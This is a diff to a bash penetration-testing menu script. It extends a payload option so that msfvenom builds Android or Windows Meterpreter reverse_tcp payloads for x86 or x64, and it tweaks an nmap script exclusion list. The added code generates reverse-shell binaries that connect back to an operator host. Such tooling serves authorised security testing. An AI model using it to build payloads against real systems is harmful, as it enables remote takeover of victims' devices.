@@ -3487,14 +3487,68 @@ fi
 
 f_payload(){
 clear
+f_banner
+echo -e "\x1B[1;34mPayloads: ***WORK IN PROGRESS*** \x1B[0m"
+echo "1.  android/meterpreter/reverse_tcp"
+echo "2.  windows/meterpreter/reverse_tcp"
+echo
+echo -n "Choice: "
+read payload
+
+# Check for choice.
+if [[ $payload -lt 1 || $payload -gt 2 ]]; then
+	f_error
+fi
+
+if [ "$payload" == "1" ]; then
+	payload="android/meterpreter/reverse_tcp"
+else
+	payload="windows/meterpreter/reverse_tcp"
+fi
+
+echo -n "Local port: "
+read port
+
+# Check for valid port number.
+if [[ $port -lt 1 || $port -gt 65535 ]]; then
+	f_error
+fi
 
 echo
-$msfv -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe --platform windows -o $home/data/payload.exe
+echo -e "\x1B[1;34mArchs:\x1B[0m"
+echo "1.  x86"
+echo "2.  x64"
+echo
+echo -n "Choice: "
+read arch
+
+# Check for choice.
+if [[ $arch -lt 1 || $arch -gt 2 ]]; then
+	f_error
+fi
+
+if [ "$arch" == "1" ]; then
+	arch="x86"
+else
+	arch="x64"
+fi
+
+if [ "$payload" == "android/meterpreter/reverse_tcp" ]; then
+	extention="apk"
+	format="raw"
+	platform="android"
+else
+	extention="exe"
+	format="exe"
+	platform="windows"
+fi
+	
+$msfv -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch.$extention
 
 echo
 echo $medium
 echo
-printf 'The malicious payload is located at \x1B[1;33m%s\x1B[0m\n' $home/data/payload.exe
+printf 'The malicious payload is located at \x1B[1;33m%s\x1B[0m\n' $home/data/payload-$platform-$arch.$extention
 echo
 echo
 exit
@@ -3538,7 +3592,7 @@ rm /tmp/listener.rc
 
 f_updates(){
 # Remove entire script categories
-ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|firewalk|firewall-bypass|ftp-libopie|ganglia-info|ftp-libopie|ftp-vuln-cve2010-4221|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation-geobytes|ip-geolocation-geoplugin|ip-geolocation-ipinfodb|ip-geolocation-maxmind|ipidseq|ipv6-node-info|ipv6-ra-flood|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|mysql-vuln-cve2012-2122|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-ready-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|samba-vuln-cve-2012-1182|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|smb-vuln-ms10-054|smb-vuln-ms10-061|smtp-vuln-cve2010-4344|smtp-vuln-cve2011-1720|smtp-vuln-cve2011-1764|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|ssl|stun-info|teamspeak2-version|tftp-enum|targets|tls-nextprotoneg|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vuze-dht-info|weblogic-t3-info|whois|xmpp-info)' > tmp
+ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|firewalk|firewall-bypass|ftp-libopie|ganglia-info|ftp-libopie|ftp-vuln-cve2010-4221|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation-geobytes|ip-geolocation-geoplugin|ip-geolocation-ipinfodb|ip-geolocation-maxmind|ipidseq|ipv6-node-info|ipv6-ra-flood|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|mysql-vuln-cve2012-2122|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-y-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|samba-vuln-cve-2012-1182|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|smb-vuln-ms10-054|smb-vuln-ms10-061|smtp-vuln-cve2010-4344|smtp-vuln-cve2011-1720|smtp-vuln-cve2011-1764|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|ssl|stun-info|teamspeak2-version|tftp-enum|targets|tls-nextprotoneg|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vuze-dht-info|weblogic-t3-info|whois|xmpp-info)' > tmp
 
 grep 'script=' discover.sh | egrep -v '(discover.sh|22.txt|smtp.txt)' | cut -d '=' -f2- | cut -d ' ' -f1 | tr ',' '\n' | egrep -v '(db2-discover|dhcp-discover|dns-service-discovery|http-email-harvest|membase-http-info|oracle-sid-brute|smb-os-discovery|sslv2)' | sort -u > tmp2
 
@@ -3706,7 +3760,7 @@ echo
 echo -e "\x1B[1;34mMISC\x1B[0m"
 echo "11. Crack WiFi"
 echo "12. Parse XML"
-echo "13. Generate a malicious Windows payload"
+echo "13. Generate a malicious payload"
 echo "14. Start a Metasploit listener"
 echo "15. Update"
 echo "16. Exit"
